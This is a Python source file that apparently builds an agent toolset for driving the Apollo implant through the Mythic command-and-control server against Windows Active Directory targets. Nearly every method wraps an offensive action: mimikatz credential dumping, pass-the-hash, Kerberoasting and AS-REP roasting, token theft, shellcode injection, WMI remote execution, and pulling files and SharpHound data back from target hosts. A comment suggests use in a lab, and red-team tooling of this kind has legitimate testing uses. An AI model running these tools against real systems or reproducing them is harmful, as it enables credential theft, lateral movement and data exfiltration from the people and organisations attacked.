import os
import tempfile
import typing as t
from uuid import uuid4

from dreadnode import Config, util
from dreadnode.agents.tools import Toolset, fs, tool_method
from loguru import logger
from mythic import mythic  # type: ignore[import-untyped]

from .mythic import Mythic as MythicTool

MYTHIC_DATA_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.realpath(__file__))), "data", "mythic"
)


class Apollo(Toolset):
    """
    A toolset for Mythic's Apollo implant, a Windows post-exploitation tool.

    When using this toolset directly (not via an agent), you must use the toolset within an async context manager (async with) to initialize the Mythic client

    Example:
        async with Apollo(password="secret", server_ip="10.0.0.1", callback_id=1) as apollo:
            result = await apollo.whoami()
    """

    username: str = Config(default="mythic_admin", description="username for Mythic C2 server")
    password: str = Config(description="password for Mythic C2 server")
    server_ip: str = Config(default="127.0.0.1", description="IP of Mythic C2 server")
    server_port: int = Config(default=443, description="Port of Mythic C2 server")
    timeout: int = Config(default=-1, description="timeout for Mythic C2 server requests")
    callback_id: int = Config(description="Apollo implant callback ID.")
    variant: str | None = Config(default="all")
    max_command_response_output: int = Config(
        default=1024**2,
        description="maximum allowable response output size, specified in number of chars",
    )

    async def __aenter__(self):
        """context manager for Apollo Toolset. Primarily initializes Mythic client for Apollo tool as well as an instance of Mythic toolset."""
        try:
            self._client = await mythic.login(
                username=self.username,
                password=self.password,
                server_ip=self.server_ip,
                server_port=self.server_port,
                timeout=self.timeout,
            )
            self._mythic_tool = MythicTool(
                username=self.username,
                password=self.password,
                server_ip=self.server_ip,
                server_port=self.server_port,
                timeout=self.timeout,
            )
            await self._mythic_tool.__aenter__()

        except Exception as e:
            logger.error(f"Failed to login to Mythic: {e}")
            raise RuntimeError(f"Failed to login to Mythic: {e}") from e

        self._local_fs = fs.Filesystem(path="/")

        return self

    async def __aexit__(self, exc_type, exc, tb):
        """ """
        await self._mythic_tool.__aexit__(exc_type, exc, tb)
        if exc_type is not None:
            logger.error(f"{exc_type}: {exc}.\n{tb}")

    async def execute(
        self,
        command: str,
        args: dict[str, t.Any] | str,
        timeout: int | None = None,
    ) -> str:
        """executes supplied command to the Apollo implant through the Mythic C2 framework

        Designed to be the core execution method that all explicit tool methods in this set use underneath.
        """
        try:
            output_bytes = await mythic.issue_task_and_waitfor_task_output(
                mythic=self._client,
                command_name=command,
                parameters=args,
                callback_display_id=self.callback_id,
                timeout=timeout if timeout is not None else self.timeout,
            )
        except Exception as e:  # noqa: BLE001
            output = f"An unexpected error occurred when trying to execute previous command. The error is:\n\n{e}.\n. Sometimes the command just needs to be re-executed, however if already tried to re-execute the command, best to move on to another."
            logger.warning(output)
            return output

        if not output_bytes:
            output = f"Command '{command}' returned no output."
            logger.info(output)
            return output

        output = str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)

        if len(output) > self.max_command_response_output:
            logger.warning(
                f"Command output exceeds maximum size of {self.max_command_response_output} chars. Truncating."
            )
            output = util.shorten_string(output, max_length=self.max_command_response_output)

        if all(
            [
                (command == "execute_assembly"),
                ("is not loaded (have you registered it?" in output),
            ]
        ):
            return f"{output}\n\nTry using 'register_assembly' tool to first register the assembly and then try executing again."

        logger.info(f"Command output: {output}")

        return output

    @tool_method(variants=["all"], catch=True)
    async def adcollector(self) -> str:
        """
        Enumerates the current Active Directory domain environment. It will give you a basic understanding of the configuration/deployment of the active directory environment. The tool will potentially produce a lot of information about the domain. Parse the output carefully for useful information.
        """
        return await self.execute(command="execute_assembly", args="ADCollector.exe")

    @tool_method(variants=["all"], catch=True)
    async def adsearch(self) -> str:
        """
        Queries the active directory for domain objects (i.e. users, computers, groups).
        """
        return await self.execute(
            command="execute_assembly",
            args="ADSearch.exe",
        )

    @tool_method(variants=["all"], catch=True)
    async def cat(
        self,
        path: t.Annotated[str, "The path of the file to read."],
    ) -> str:
        """
        Read the contents of a file at the specified path.
        """
        return await self.execute(command="cat", args=path)

    @tool_method(variants=["all"], catch=True)
    async def cd(self, path: t.Annotated[str, "The path to change into."]) -> str:
        """
        Change directory to path. Path relative identifiers such as ../ are accepted. The path can be absolute or relative. If the path is relative, it will be resolved against the current working directory of the agent.
        """
        return await self.execute(
            command="cd",
            args=path,
        )

    @tool_method(variants=["all"], catch=True)
    async def cp(
        self,
        source: t.Annotated[str, "The path to the source file on the target system to copy."],
        destination: t.Annotated[
            str,
            "The destination path on the target system to copy the file to.",
        ],
    ) -> str:
        """
        Copy a file from the source path to the destination path on the target system. The source and destination paths can be absolute or relative. If the paths are relative, they will be resolved against the current working directory of the agent.
        """
        return await self.execute(command="cp", args={"source": source, "destination": destination})

    @tool_method(variants=["all"], catch=True)
    async def download(
        self,
        path: t.Annotated[str, "The full path of the file on the target system to download."],
    ) -> str:
        """
        Download a file from the target system to the C2 server. The file will be saved with the specified filename on the C2 server.
        """
        return await self.execute(
            command="download",
            args=path,
        )

    @tool_method(variants=["all"], catch=True)
    async def download_to_local_file(
        self,
        path: t.Annotated[str, "The full path of the file on the target system to download."],
    ) -> str | dict:
        """
        Download a file from a target callback host to a local file. The file will first be downloaded from the target callback host to the Mythic C2 server, then from the Mythic C2 server to a local file.
        """

        # 1. initiate file download from callback host to Mythic server
        download_result = await self.download(path=path)
        if "does not exist." in download_result:
            return f"Error running 'download_to_local_file' command.\n\n Command response:\n{download_result}"

        # 2. download file from Mythic server
        fbytes = await self._mythic_tool.download_file_from_server(filename=path)
        if fbytes is None:
            return f"File '{path}' could not be downloaded from Mythic server to local file system. Is the filename correct?"

        # 3. write file to local system
        saved_fp = await self._write_tmp_file(filename=path, raw_bytes=fbytes)

        return {"name": os.path.basename(saved_fp.name), "path": saved_fp.name}

    @tool_method(variants=["all"], catch=True)
    async def getprivs(self) -> str:
        """
        Attempt to enable all possible privileges for the agent's current access token. This may include privileges like SeDebugPrivilege, SeImpersonatePrivilege, etc.
        """
        return await self.execute(
            command="getprivs",
            args="",
        )

    @tool_method(variants=["all"], catch=True)
    async def ifconfig(self) -> str:
        """
        List the network interfaces and their configuration details on the target system. This includes IP addresses, subnet masks, and other relevant information.
        """
        return await self.execute(
            command="ifconfig",
            args="",
        )

    @tool_method(variants=["all"], catch=True)
    async def jobkill(
        self,
        jid: t.Annotated[int, "The job identifier of the background job to terminate."],
    ) -> str:
        """
        Terminate a background job with the specified job identifier (jid). This will stop the job from running and free up any resources it was using.
        """
        return await self.execute(
            command="jobkill",
            args=str(jid),
        )

    @tool_method(variants=["all"], catch=True)
    async def jobs(self) -> str:
        """
        List all currently active background jobs being managed by the agent. This includes jobs that are running, completed, or failed.
        """
        return await self.execute(
            command="jobs",
            args="",
        )

    @tool_method(variants=["all"], catch=True)
    async def ls(
        self,
        path: t.Annotated[
            str | None,
            "The path of the directory to list. Defaults to the current working directory.",
        ] = None,
    ) -> str:
        """
        List files and folders in a specified directory.
        """
        args = "" if not path or "null" in path.lower() else {"path": path}

        return await self.execute(
            command="ls",
            args=args,
        )

    @tool_method(variants=["all"], catch=True)
    async def make_token(
        self,
        username: t.Annotated[str, "The username to use for the new logon session."],
        password: t.Annotated[str, "The password for the specified username."],
        *,
        netonly: t.Annotated[
            bool,
            "If true, the token will be created for network access only. If false, the token will be created for interactive access.",
        ] = False,
    ) -> str:
        """
        Create a new logon session using the specified [username] and [password]. The token can be created for network access only or interactive access based on the [netonly] parameter.
        """
        return await self.execute(
            command="make_token",
            args={"username": username, "password": password, "netOnly": str(netonly)},
        )

    @tool_method(variants=["all"], catch=True)
    async def mimikatz(
        self,
        commands: t.Annotated[
            str, "A list of Mimikatz commands to execute. Separate commands by a space."
        ],  # type: ignore,
    ) -> str:
        """
        Execute one or more mimikatz commands using its reflective library.

        Example commands:
            sekurlsa::logonpasswords
            sekurlsa::tickets
            token::list
            lsadump::sam
            sekurlsa::wdigest
            vault::cred
            vault::list
            sekurlsa::dpapi
        """
        return await self.execute(
            command="mimikatz",
            args=commands,
        )

    @tool_method(variants=["all"], catch=True)
    async def net_dclist(
        self,
        domain: t.Annotated[
            str | None,
            "The target domain for which to enumerate Domain Controllers. Defaults to the current domain if omitted.",
        ] = "",
    ) -> str:
        """
        Get domain controllers belonging to domain.
        """
        if not domain or "null" in domain.lower():
            return "Argument error, must supply domain."

        return await self.execute(
            command="net_dclist",
            args=domain,
        )

    @tool_method(variants=["all"], catch=True)
    async def net_localgroup(
        self,
        computer: t.Annotated[
            str,
            "Command line arguments for the 'net_localgroup' command. Defaults to the local machine (localhost) if omitted.",
        ] = "localhost",
    ) -> str:
        """
        List the local groups on the specified computer. If no computer is specified, the local machine will be used.
        """
        return await self.execute(
            command="net_localgroup",
            args=computer if computer is not None else "localhost",
        )

    @tool_method(variants=["all"], catch=True)
    async def net_localgroup_member(
        self,
        group: t.Annotated[str, "target group to list group members"],
        computer: t.Annotated[
            str,
            "target computer to list group members",
        ] = "localhost",
    ) -> str:
        """
        List the members of a specific local group on the specified computer. If no computer is specified, the local machine will be used.
        """
        return await self.execute(
            command="net_localgroup_member",
            args={"computer": computer, "group": group},
        )

    @tool_method(variants=["all"], catch=True)
    async def net_shares(
        self,
        computer: t.Annotated[
            str,
            "The hostname or IP address of the target computer. Defaults to the local machine (localhost) if omitted.",
        ] = "localhost",
    ) -> str:
        """
        List network shares available on the specified [computer]. If no computer is specified, the local machine will be used.
        """

        return await self.execute(
            command="net_shares",
            args=computer,
        )

    @tool_method(variants=["all"], catch=True)
    async def netstat(
        self,
        *,
        listen: t.Annotated[bool, "list ports in listening state"] = True,
        established: t.Annotated[bool, "list ports in established state"] = True,
        tcp: t.Annotated[bool, "list ports using TCP"] = True,
        udp: t.Annotated[bool, "list ports using UDP"] = True,
    ) -> str:
        """
        Display active TCP/UDP connections and listening ports on the target system.
        This includes information about the local and remote addresses, port numbers, and connection states.
        """
        return await self.execute(
            command="netstat",
            args={
                "listen": str(listen).lower(),
                "established": str(established).lower(),
                "tcp": str(tcp).lower(),
                "udp": str(udp).lower(),
            },
        )

    @tool_method(variants=["all"], catch=True)
    async def powerpick(
        self,
        arguments: t.Annotated[
            str,
            "The PowerShell command or script block to execute. This can be a single command or a script block enclosed in curly braces.",
        ],
    ) -> str:
        """
        Injects a PowerShell loader into a sacrificial process and executes the provided PowerShell command. This allows for executing PowerShell commands or scripts in the context of the agent's current security token.
        """
        return await self.execute(command="powerpick", args=arguments)

    @tool_method(variants=["all"], catch=True)
    async def powershell(
        self,
        arguments: t.Annotated[
            str,
            "Powershell command line arguments to supply to the powershell instance and execute.",
        ],
        timeout: t.Annotated[
            int, "time duration, in seconds, to wait for powershell command to return"
        ] = 30,
    ) -> str:
        """
        Executes Powershell with the supplied command line arguments in current Powershell instance.
        """
        return await self.execute(command="powershell", args=arguments, timeout=timeout)

    @tool_method(variants=["all"], catch=True)
    async def powershell_import(
        self,
        filename: t.Annotated[
            str,
            ".ps1 file to be registered within Apollo agent and made available to PowerShell jobs",
        ],
    ) -> str:
        """
        Register a new powershell .ps1 file in the Apollo agent and allow for powershell script to be available for PowerShell jobs. This is not Powershell's Import-Module command but Apollo's native powershell import command. The file must exist on the Mythic C2 server. If file is not present, it can be uploaded with the upload tool.
        """
        return await self.execute(
            command="powershell_import",
            args={"existingFile": filename},
            timeout=60,  # ignore
        )

    @tool_method(variants=["all"], catch=True)
    async def powershell_script(
        self,
        entry_function: t.Annotated[
            str,
            "Name of the Powershell entry function to call to start execution of the script.",
        ],
        *,
        filepath: t.Annotated[
            str | None,
            "File path of powershell script. 'filepath' or 'script' must be supplied.",
        ] = None,
        script: t.Annotated[
            str | None,
            "Powershell script. Encoded as a raw string. 'filepath' or 'script' must be supplied.",
        ] = None,
        args: t.Annotated[str, "(Optional) Arguments to supply the entry function."] = "",
        reupload: t.Annotated[
            bool,
            "Whether to re-upload the powershell script to the Mythic server (which is done before downloading and executing script on the target host), if the script file already exists on the server (from previous uploading).",
        ] = True,
    ) -> str:
        """
        Executes the supplied powershell script on a target host. Supply the powershell script as a string. The powershell script must be composed of powershell functions where one of these functions will be the entry function that will be called to start the script.
        """
        if not any([filepath, script]):
            raise ValueError("Either 'filepath' or 'script' argument must not be None.")

        if script is not None:
            # 1. If script string provided, write to local temp file
            filename = f"pwsh_script_{str(uuid4())[:8]}.ps1"

            # NOTE: cant use Python tempfile here as need specific filename
            tmp_file = await self._write_tmp_file(filename=filename, text=script)
            filepath = tmp_file.name
        else:
            if filepath is None:
                raise ValueError("filepath must be provided when script is None")
            filename = filepath.split("/")[-1]

        # 2. upload powershell script file to Mythic server
        upload_result = await self._mythic_tool.upload_file_to_server(
            filepath=filepath, reupload=reupload
        )

        if script is not None and not await self._local_fs.delete(path=filepath):
            # cleanup temp file
            logger.warning(f"temporary file deletion failed for '{filepath}'")

        if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
            return "Error running 'powershell_script' command.\n\n Attempting to upload powershell script file to Mythic led to unknown error."

        # 3. powershell import the script file from Mythic server to the target callback/implant
        pi_result = await self.powershell_import(filename)

        if "will now be imported in PowerShell commands" not in pi_result:
            return f"Error running 'powershell_import' Mythic command for Apollo agent (as precursor to executing powershell script). Error response: {pi_result}"

        # 4. run the powershell script on the target callback/implant
        return await self.powershell(arguments=f"{entry_function} {args}")

    @tool_method(variants=["all"], catch=True)
    async def powerview(
        self,
        command: t.Annotated[
            str,
            "Powerview command line arguments to supply to the powershell instance and execute.",
        ],
        credential_user: t.Annotated[
            str | None, "(Optional) username to execute Powerview commands as specified user"
        ] = None,
        credential_password: t.Annotated[
            str | None, "(Optional) password to execute Powerview commands as specified user"
        ] = None,
        domain: t.Annotated[
            str | None, "(Optional) domain to execute Powerview commands as specified user"
        ] = None,
    ) -> str:
        """
        Imports PowerView into Powershell (for use) and then executes the supplied command line arguments in current Powershell instance.
        """

        # 1. check if powerview on Mythic server, upload if not there
        powerview_script_filename = "PowerView.ps1"
        upload_result = await self._mythic_tool.upload_file_to_server(
            filepath=os.path.join(MYTHIC_DATA_DIR, powerview_script_filename),
            reupload=False,
        )
        if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
            return f"Error running 'powerview' command.\n\n Attempting to upload {powerview_script_filename} file to Mythic led to unknown error."
        logger.info(f"Uploaded {powerview_script_filename} to Mythic.")

        # 2. import powerview into Mythic beacon
        pi_result = await self.powershell_import(filename=upload_result["filename"])
        if "will now be imported in PowerShell commands" not in pi_result:
            return f"Error running [COMMAND] 'powershell_import': - {pi_result}."

        # 3. if command has credential user, add credential flag with powershell credential grab to Powerview command args
        powerview_cmd = command
        if all([credential_user, credential_password, domain]):
            powerview_cmd = f"{powerview_cmd} -Credential (New-Object -TypeName 'System.Management.Automation.PSCredential' -ArgumentList '{domain}\\{credential_user}', (ConvertTo-SecureString -String '{credential_password}' -AsPlainText -Force))"

        # 4. run powerview (through powershell)
        return await self.powershell(arguments=powerview_cmd)

    @tool_method(variants=["all"], catch=True)
    async def pth(
        self,
        domain: t.Annotated[
            str, "The target domain for which to perform the Pass-the-Hash operation."
        ],
        username: t.Annotated[str, "The username to authenticate as."],
        ntlm_hash: t.Annotated[
            str,
            "The NTLM hash of the user's password. This is used instead of the plaintext password.",
        ],
    ) -> str:
        """
        Authenticate to a remote system using a Pass-the-Hash technique with the specified domain, username, and password_hash. This allows for authentication without needing the plaintext password.
        """
        return await self.execute(
            command="pth", args={"domain": domain, "user": username, "ntlm": ntlm_hash}
        )

    @tool_method(variants=["all"], catch=True)
    async def ps(self) -> str:
        """
        List running processes on the target system, typically including PID, name, architecture, and user context.
        """
        return await self.execute(
            command="ps",
            args="",  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def pwd(self) -> str:
        """
        Print the agent's current working directory on the target system. This is the directory where the agent is currently operating.
        """
        return await self.execute(
            command="pwd",
            args="",  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def reg_query(
        self,
        key: t.Annotated[
            str,
            "The full path of the registry key to query (e.g., 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion').",
        ],
    ) -> str:
        """
        Query the values and subkeys under a specified registry [key]. This allows for retrieving information from the Windows registry.
        """
        return await self.execute(
            command="reg_query",
            args=key,  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def register_assembly(
        self,
        filename: t.Annotated[str, "Assembly file to register to the Apollo agent"],
    ) -> str:
        """
        Registers (loads) assembly files/commands to a Mythic agent.
        """
        return await self.execute(
            command="register_assembly",
            args={"existingFile": filename},
        )

    @tool_method(variants=["all"], catch=True)
    async def rev2self(self) -> str:
        """
        Revert the agent's impersonation state, returning to its original primary token. This is useful for restoring the agent's original security context after performing actions with a different token.
        """
        return await self.execute(
            command="rev2self",
            args="",  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def rubeus_asreproast(self) -> str:
        """
        Execute ASREP-Roast technique against current domain using the Rubeus tool. The technique extracts kerberos ticket-granting tickets for active directory users that dont require pre-authentication on the domain. If ticket-granting tickets can be obtained, they will be returned (in hash form).
        """
        return await self.execute(
            command="execute_assembly",
            args="Rubeus.exe asreproast /format:hashcat",  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def rubeus_kerberoast(
        self,
        cred_user: t.Annotated[
            str,
            "principal domain user to execute the command under, formatted in fqdn format: 'domain\\user'",
        ],
        cred_password: t.Annotated[str, "principal domain user password"],
        user: t.Annotated[
            str | None, "(optional) specific domain user to target for kerberoasting"
        ] = None,
        spn: t.Annotated[str | None, "(optional) specific SPN to target for kerberoasting"] = None,
    ) -> str:
        """
        Execute kerberoasting technique against current domain using the Rubeus tool. The tool extracts kerberos ticket-granting tickets for active directory users that have service principal names (SPNs) set. To use 'rubeus_kerberoast' tool, you must have a username and password of existing user on the active directory domain. If ticket-granting tickets for the SPN accounts can be obtained, they will be returned (in a hash format).
        """
        args = f"Rubeus.exe kerberoast /creduser:{cred_user} /credpassword:{cred_password} /format:hashcat"

        if user is not None:
            args += f" /user:{user}"

        if spn is not None:
            args += f" /spn:{spn}"

        return await self.execute(command="execute_assembly", args=args)

    @tool_method(variants=["all"], catch=True)
    async def seatbelt(
        self, group: t.Annotated[str, "Group flag. Options: 'all', 'system'."] = "all"
    ) -> str:
        """
        Performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives.
        """
        return await self.execute(command="execute_assembly", args=f'Seatbelt.exe "-group={group}"')

    # NOTE: Could not get this command to work on the Mythic side.
    @tool_method(variants=["all"], catch=True)
    async def set_injection_technique(
        self,
        technique: t.Annotated[
            str,
            "The name of the process injection technique to use for subsequent injection commands (e.g., 'CreateRemoteThread', 'MapViewOfSection'). Must be a technique supported by the agent (see `get_injection_techniques`).",
        ],
    ) -> str:
        """
        Set the default process injection technique used by commands like `assembly_inject`, `execute_assembly`, etc. This allows for specifying the method of injecting code into a target process.
        """
        return await self.execute(
            command="set_injection_technique",
            args=technique,  # type: ignore[arg-type]
        )

    """
    NOTE: This tool goes against the pattern of just umbrella'ing anything that powershell can run under the 'powershell' tool. However setspn is very useful to GOAD attacks and Mythic doesnt seem to capture stdout from setspn utility correctly. Thus we provide a unique tool for setspn so we can wrap it in light script that seems to fix the problem of not capturing its output.
    """

    @tool_method(variants=["all"], catch=True)
    async def setspn(self, args: t.Annotated[str, "command line arguments for setspn tool"]) -> str:
        """
        Allows for reading, modifying, and deleting the Service Principal Names (SPN) directory property for an Active Directory (AD) account. You can use setspn to view the current SPNs for an account, reset the account's default SPNs, and add or delete supplemental SPNs.
        """
        return await self.execute(
            command="powershell",
            args=f"($sspn = setspn {args}); echo $sspn",  # type: ignore[arg-type]
        )

    """
    NOTE: Running the SharpHound version from (Mythic) Forge created collection data that failed to parse in BloodHound CE. Resorted to using the Sharphound version that comes with Bloodhound CE. As such, we use a stashed version of SharpHound, upload to Mythic and then powershell import it to callback host for executing.
    """

    @tool_method(variants=["all"], catch=True)
    async def sharphound_and_download(
        self,
        domain: t.Annotated[str, "domain to enumerate."],
        ldap_username: t.Annotated[
            str | None, " (Optional) LDAP username to use for Sharphound."
        ] = None,
        ldap_password: t.Annotated[
            str | None, "(Optional) LDAP password to use for Sharphound."
        ] = None,
        local_filename: t.Annotated[
            str | None,
            "(Optional) Filename to save the local file as, a unique name will be created if none is supplied.",
        ] = None,
    ) -> str | dict:
        """
        Run sharphound on the target callback to collect Bloodhound data. Then download the Bloodhound results file to a local file. "local" being wherever the agent is running.
        """

        # 1. Upload SharpHound v.2.6.7 to Mythic Server
        upload_result = await self._mythic_tool.upload_file_to_server(
            filepath=os.path.join(MYTHIC_DATA_DIR, "sharphound-v2.6.7", "SharpHound.ps1"),
            reupload=False,
        )
        if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
            return "Error running command 'sharphound_and_download'.\n\n Attempting to upload powershell script file to Mythic led to unknown error."
        logger.info("Uploaded SharpHound to Mythic.")

        # 2. powershell import the script file from Mythic server to the target callback/implant
        pi_result = await self.powershell_import(filename=upload_result["filename"])
        if "will now be imported in PowerShell commands" not in pi_result:
            return f"Error running 'sharphound_and_download': {pi_result}"

        # 3. run the powershell command for running Sharphound on the target callback/implant
        zip_filename_marker = f"{uuid4()!s}.zip"
        sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_filename_marker} -Domain {domain}"
        if all([ldap_username, ldap_password]):
            sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"

        sharphound_result = await self.powershell(arguments=sharp_cmd, timeout=120)

        if "SharpHound Enumeration Completed" not in sharphound_result:
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharphound_result}"

        # 4. Find the sharphound results file. Sharphound (annoyingly) automatically prefaces the desired filename with a timestamp. So we can find the file but we dont know its exact name until its created. We look for the file in the current directory with powershell Get-ChildItem.

        sharp_results_fn = await self.powershell(
            arguments=f"(Get-ChildItem -Path .\\ -Filter '*{zip_filename_marker}').name"
        )

        if zip_filename_marker not in sharp_results_fn:
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharp_results_fn}"

        # parse filename from output, comes back from Apollo with extra chars
        sharp_results_fn = sharp_results_fn.strip("\r\n").split("\r\n")[-1]

        # 5. Download Sharphound collection data to local file (local to where the agent is running)
        local_download_file = await self.download_to_local_file(path=sharp_results_fn)

        if not isinstance(local_download_file, dict):
            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{local_download_file}"
        logger.info(f"Downloaded file to:{local_download_file['path']}")

        # 6. Rename local file if supplied Command specified a specific filename to use
        if local_filename:
            os.rename(local_download_file["path"], local_filename)
            logger.info(f"Renamed filename from {local_download_file['path']} to {local_filename}")
            local_download_file["path"] = os.path.abspath(local_filename)
            local_download_file["name"] = os.path.basename(local_download_file["path"])

        return local_download_file

    async def sharpview(
        self,
        method: t.Annotated[str, "SharpView method to execute"] = "help",
        method_args: t.Annotated[str, "arguments for the selected SharpView method"] = "",
    ) -> str:
        """
        The Sharpview tool is exposed to a model through its own toolset (i.e. sharpview.Sharpview). This method is used to proxy Sharpview tool calls if executing Sharpview through Mythic.

        At tool initialization, to enable Sharpview within this Apollo instance, just supply this Apollo instance to sharpview.Sharpview(apollo=<apollo instance>) constructor and all Sharpview tool calls will be proxied to this method and through the Mythic C2 server to the Apollo implant.
        """
        return await self.execute(
            command="execute_assembly",
            args=f"SharpView.exe {method} {method_args}",
        )

    @tool_method(variants=["all"], catch=True)
    async def shinject(
        self,
        pid: t.Annotated[int, "Target process PID."],
        shellcode_filepath: t.Annotated[str, "Local shell code file."],
    ) -> str:
        """
        Inject raw shellcode into a remote process. This allows for executing arbitrary code in the context of another process.
        """

        # need to first upload shellcode file to Mythic server
        upload_result = await self._mythic_tool.upload_file_to_server(
            filepath=shellcode_filepath, reupload=True
        )

        if not isinstance(upload_result, dict) or upload_result.get("file_id") is None:
            return "Error running 'shinject' command.\n\n Attempting to upload shellcode file to Mythic led to unknown error."

        return await self.execute(
            command="shinject",
            args={"pid": pid, "shellcode_file_id": upload_result["file_id"]},
        )

    @tool_method(variants=["all"], catch=True)
    async def spawnto_x64(
        self,
        application: t.Annotated[
            str,
            "The full path to the 64-bit executable that the agent should launch for subsequent post-exploitation jobs or spawning new sessions.",
        ],
        args: t.Annotated[
            str | None,
            "(optional) A list of command-line arguments to launch the [path] executable with.",
        ] = "",
    ) -> str:
        """
        Configure the default 64-bit executable [path] (and optional [args]) used for process injection targets and spawning. This allows for specifying the executable that will be used for subsequent post-exploitation jobs or spawning new sessions.
        """
        return await self.execute(
            command="spawnto_x64",
            args={"application": application, "arguments": args},
        )

    @tool_method(variants=["all"], catch=True)
    async def steal_token(
        self,
        pid: t.Annotated[
            int,
            "The process ID (PID) from which to steal the primary access token. If omitted, a default process (like winlogon.exe) might be targeted.",
        ],
    ) -> str:
        """
        Impersonate the primary access token of another process specified by its pid. This allows for executing commands with the security context of the target process.
        """
        return await self.execute(
            command="steal_token",
            args=str(pid),
        )

    @tool_method(variants=["all"], catch=True)
    async def upload(
        self,
        filepath: t.Annotated[str, "file path of local file to upload to host."],
        target_host_path: t.Annotated[str, "target filepath on target host to place uploaded file"],
    ) -> str:
        """
        Upload a local file to target host, through Mythic C2. The file will be saved with the specified filename on the target system.
        """

        upload_status = await self._mythic_tool.upload_file_to_server(
            filepath=filepath, reupload=True
        )
        if not isinstance(upload_status, dict) or upload_status.get("file_id") is None:
            err_msg = f"File could not be uploaded to Mythic server: '{filepath}'"
            logger.error(err_msg)
            return err_msg

        return await self.execute(
            command="upload",
            args={"remote_path": target_host_path, "file": upload_status["file_id"]},
        )

    @tool_method(variants=["all"], catch=True)
    async def whoami(self) -> str:
        """
        Display the username associated with the agent's current security context (impersonated token or primary token). This includes information about the user and their privileges.
        """
        return await self.execute(
            command="whoami",
            args="",  # type: ignore[arg-type]
        )

    @tool_method(variants=["all"], catch=True)
    async def wmiexecute(
        self,
        command: t.Annotated[str, "the full path and arguments of the process to execute"],
        host: t.Annotated[
            str, "computer to execute the command on. If empty, the current computer"
        ],
        username: t.Annotated[str, "username of the account to execute the wmi process as"],
        password: t.Annotated[str, "plaintext password of the account"],
        domain: t.Annotated[str, "domain name for the account"],
    ) -> str:
        """
        Execute a command on a remote system using WMI (Windows Management Instrumentation). This allows for executing commands remotely without needing to establish a direct connection.
        """
        return await self.execute(
            command="wmiexecute",
            args={
                "command": command,
                "host": host,
                "username": username,
                "password": password,
                "domain": domain,
            },  # type: ignore[arg-type]
        )

    """ Utilities """

    async def _try_to_install_ad_module(self) -> bool:
        """attempts to install the Powershell ActiveDirectory module on the configured callback implant"""

        logger.info(
            f"For callback {self.callback_id}, will attempt to install Powershell ActiveDirectory module"
        )

        # 1. Install RSAT-AD-PowerShell module
        await self.powershell(
            arguments="Install-WindowsFeature -Name RSAT-AD-PowerShell -IncludeManagementTools"
        )

        # 2. Import ActiveDirectory module
        await self.powershell(arguments="Import-Module -Name ActiveDirectory")

        # 3. Verify ActiveDirectory module imported
        result_2 = await self.powershell(arguments="Get-Module -Name ActiveDirectory")
        result_2 = str(result_2)

        if "Manifest" in result_2 and "ActiveDirectory" in result_2:
            logger.info("Successfully installed Powershell ActiveDirectory module.")
            return True
        return False

    async def _write_tmp_file(
        self, filename: str, text: str | None = None, raw_bytes: bytes | None = None
    ) -> fs.FilesystemItem:
        """creates a file, also in a temporary directory, and writes supplied contents.

        Returns: FilesystemItem with the file path
        """
        if not raw_bytes and not text:
            raise TypeError("File contents, as bytes or text must be supplied.")

        tmp_dir = tempfile.TemporaryDirectory(delete=False)

        if "\\" in filename:
            filename = filename.split("\\")[-1]
        elif "/" in filename:
            filename = filename.split("/")[-1]

        fullpath = os.path.join(tmp_dir.name, filename)

        if raw_bytes:
            return await self._local_fs.write_file_bytes(path=fullpath, byte_data=raw_bytes)
        assert text is not None, "text must be provided when raw_bytes is None"
        return await self._local_fs.write_file(path=fullpath, contents=text)
